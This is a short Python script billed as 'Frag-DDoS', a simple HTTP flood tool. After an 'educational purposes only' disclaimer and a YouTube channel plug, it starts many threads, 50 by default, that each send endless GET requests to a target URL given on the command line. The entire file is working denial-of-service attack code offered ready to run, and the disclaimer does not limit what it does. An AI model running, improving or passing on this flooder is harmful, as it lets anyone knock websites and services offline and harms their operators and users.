import requests
import threading
import argparse
import time

# ────── Disclaimer Prompt ────── #
disclaimer = """
╔════════════════════════════════════════════════════╗
║                ⚠️  DISCLAIMER NOTICE ⚠️              ║
╠════════════════════════════════════════════════════╣
║ This tool is for educational purposes ONLY.        ║
║                                                    ║
║ Do NOT use this to attack websites, servers, or    ║
║ devices you do not own or have permission to test. ║
║                                                    ║
║ The developer is NOT responsible for misuse,       ║
║ damage, legal issues, or anything dumb you do.     ║
╚════════════════════════════════════════════════════╝

💥 Want more tools? Subscribe to TechGuyNo:
📺 https://www.youtube.com/@techguyno

Press ENTER to accept and continue...
"""

print(disclaimer)
input()

# ────── Main Attack Function ────── #
def attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"[+] Sent => {url} | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Failed to send request. Target may be down.")
        except KeyboardInterrupt:
            print("[!] Attack stopped.")
            break

# ────── CLI Argument Parser ────── #
parser = argparse.ArgumentParser(description="Frag-DDoS | Simple HTTP Flood Tool")
parser.add_argument("-u", "--url", help="Target URL (e.g. https://example.com)", required=True)
parser.add_argument("-t", "--threads", help="Number of threads (default: 50)", type=int, default=50)
args = parser.parse_args()

url = args.url
threads = args.threads

# ────── Thread Launcher ────── #
print(f"\n[!] Launching {threads} threads against: {url}\n")

for i in range(threads):
    t = threading.Thread(target=attack, args=(url,))
    t.daemon = True  # Allows threads to close on Ctrl+C
    t.start()

# Keep the script alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Script terminated by user.")
